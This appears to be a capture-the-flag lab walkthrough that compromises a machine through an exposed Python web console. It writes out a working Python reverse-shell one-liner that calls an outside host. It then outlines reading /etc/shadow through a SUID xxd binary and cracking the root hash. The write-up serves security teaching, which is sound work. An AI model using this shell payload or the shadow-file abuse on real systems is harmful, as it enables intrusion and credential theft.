


First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.3`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6280dee-4403-4f9d-8697-bb3b0628ed4b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6280dee-4403-4f9d-8697-bb3b0628ed4b/Untitled.png)

Looks like we only have 2 ports open, lets check out the web site on port 80

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a1e563f2-c369-4f6e-b7d0-aa078b8a6c99/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a1e563f2-c369-4f6e-b7d0-aa078b8a6c99/Untitled.png)

Seems like we have just a basic web site here, lets enumerate for directories with **dirsearch**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/76d4f29b-60fe-4f74-9674-35d19f6a0f60/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/76d4f29b-60fe-4f74-9674-35d19f6a0f60/Untitled.png)

A couple of these such as /contact and /blog can be seen from the main page, however /console looks interesting.  Lets go there and see what we got.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9ca49121-7e6a-4119-8b74-56a78a77c326/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9ca49121-7e6a-4119-8b74-56a78a77c326/Untitled.png)

Looks like we have an interactive console on the website that we can execute python code on.  I tried a simple **print("hello world")** which worked successfully.  I then executed the following to test and see if we was executing code straight from the server and make sure this wasn't some kind of rabbit hole.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dc8e8c15-63b0-4844-8712-fa52b35a568b/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dc8e8c15-63b0-4844-8712-fa52b35a568b/Untitled.png)

This looks good.  Since we are executing python code from the server, we can execute a python reverse shell one liner like the following to get a reverse shell..

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

If we start a netcat listener on out machine and execute this, we get a shell as the user **megan**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/71100ca5-58e2-42b7-a135-41a0ec2dd6e2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/71100ca5-58e2-42b7-a135-41a0ec2dd6e2/Untitled.png)

Now lets copy **LinPEAS** to the machine and see what we can find.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/92680c4f-af14-471a-9626-22a4a9f76dc5/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/92680c4f-af14-471a-9626-22a4a9f76dc5/Untitled.png)

We see an interesting SUID binary that we may be able to abuse.  Lets look at **GTFOBins** and see what we can find.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a8364bf-be33-4b73-970d-793ae384cc44/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a8364bf-be33-4b73-970d-793ae384cc44/Untitled.png)

Looks like we may be able to abuse xxd to read files we don't have permission too.  Lets see if we can read the contents of **/etc/shadow**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9fe23d06-ee51-48d5-9595-c22a0d26cb2f/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9fe23d06-ee51-48d5-9595-c22a0d26cb2f/Untitled.png)

It worked!  Lets copy the root hash and run it through john to see if we can crack it.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/048552f8-c9da-47f8-912e-ebcff0c5c4a2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/048552f8-c9da-47f8-912e-ebcff0c5c4a2/Untitled.png)

Looks like we have a password!  Now we can login and have full root access to the machine!

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad6fc2f3-bfad-4d75-9274-816c6e9b6438/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad6fc2f3-bfad-4d75-9274-816c6e9b6438/Untitled.png)
